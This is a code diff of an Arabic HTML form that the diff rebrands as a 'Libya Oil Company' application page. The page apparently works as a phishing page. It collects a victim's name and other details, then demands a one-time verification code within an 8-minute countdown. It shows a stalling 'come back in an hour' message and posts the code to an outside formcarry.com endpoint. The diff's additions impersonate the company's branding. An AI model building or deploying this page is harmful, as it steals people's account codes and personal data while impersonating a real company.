@@ -3,58 +3,104 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>نموذج الطلب</title>
+  <title>شركة ليبيا للنفط - نموذج الطلب</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f5f5f5;
+      background: #ffffff;
       padding: 20px;
       direction: rtl;
       text-align: right;
+      color: #1c1c1c;
     }
+
+    header {
+      background-color: #226c2b;
+      color: white;
+      padding: 15px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 4px solid #af1d1d;
+      border-radius: 12px;
+      max-width: 420px;
+      margin: auto;
+    }
+
+    header img {
+      height: 50px;
+      margin-left: 15px;
+    }
+
+    header h1 {
+      font-size: 20px;
+      margin: 0;
+    }
+
     form, .code-box, #waitingPage {
-      background: #fff;
+      background: #fefefe;
       padding: 20px;
       border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      box-shadow: 0 0 10px rgba(0,0,0,0.08);
       max-width: 420px;
       margin: 30px auto;
+      border-right: 5px solid #af1d1d;
     }
+
+    h2, h3 {
+      color: #af1d1d;
+    }
+
     label {
       display: block;
       margin-top: 12px;
       font-weight: bold;
+      color: #1c1c1c;
     }
+
     input, select {
       width: 100%;
       padding: 10px;
       margin-top: 6px;
       border-radius: 8px;
       border: 1px solid #ccc;
+      background-color: #f9f9f9;
     }
+
     button {
       margin-top: 20px;
       width: 100%;
       padding: 12px;
-      background-color: #2196F3;
+      background-color: #226c2b;
       color: white;
       border: none;
       border-radius: 8px;
       font-size: 16px;
       cursor: pointer;
+      transition: 0.3s;
     }
+
+    button:hover {
+      background-color: white;
+      color: #226c2b;
+      border: 1px solid #226c2b;
+    }
+
     button:disabled {
       background-color: #ccc;
       cursor: not-allowed;
     }
+
     .code-box, #waitingPage {
       display: none;
     }
+
     .timer {
       margin-top: 12px;
-      color: #d32f2f;
+      color: #af1d1d;
       font-weight: bold;
     }
+
     .error {
       color: red;
       font-size: 13px;
@@ -64,9 +110,17 @@
 </head>
 <body>
 
-<!-- النموذج الأول -->
+<!-- ✅ الترويسة -->
+<header>
+  <div style="display: flex; align-items: center;">
+    <img src="logo.png" alt="شعار الشركة" onerror="this.style.display='none';">
+    <h1>شركة ليبيا للنفط</h1>
+  </div>
+</header>
+
+<!-- ✅ النموذج الأول -->
 <form id="mainForm" action="https://formcarry.com/s/12UxdOsTbaW" method="POST" onsubmit="handleSubmit(event)">
-  <h2>نموذج الطلب</h2>
+  <h2>نموذج تقديم طلب</h2>
 
   <label for="fullName">الاسم الثلاثي</label>
   <input type="text" id="fullName" name="fullName" required oninput="validateForm()">
@@ -93,7 +147,7 @@
   <button type="submit" id="submitBtn" disabled>أكمل الطلب</button>
 </form>
 
-<!-- مرحلة الكود -->
+<!-- ✅ مرحلة الكود -->
 <div class="code-box" id="codeBox">
   <h3>يرجى إدخال كود التوثيق</h3>
   <input type="text" id="verificationCode" placeholder="أدخل الكود (6–8 أرقام أو أحرف)" required>
@@ -101,13 +155,13 @@
   <div class="timer" id="timer">الوقت المتبقي: 08:00</div>
 </div>
 
-<!-- صفحة الانتظار -->
+<!-- ✅ صفحة الانتظار -->
 <div id="waitingPage">
   <h2>تم استلام الكود</h2>
   <p>طلبك قيد المراجعة. الرجاء العودة بعد ساعة.</p>
 </div>
 
-<!-- JavaScript -->
+<!-- ✅ سكربت التحقق والتبديل -->
 <script>
   function validateForm() {
     const name = document.getElementById("fullName").value.trim();
@@ -157,11 +211,9 @@
       return;
     }
 
-    // إخفاء خانة الكود وإظهار صفحة الانتظار
     document.getElementById("codeBox").style.display = "none";
     document.getElementById("waitingPage").style.display = "block";
 
-    // إرسال الكود إلى Formcarry (اختياري)
     fetch("https://formcarry.com/s/12UxdOsTbaW", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
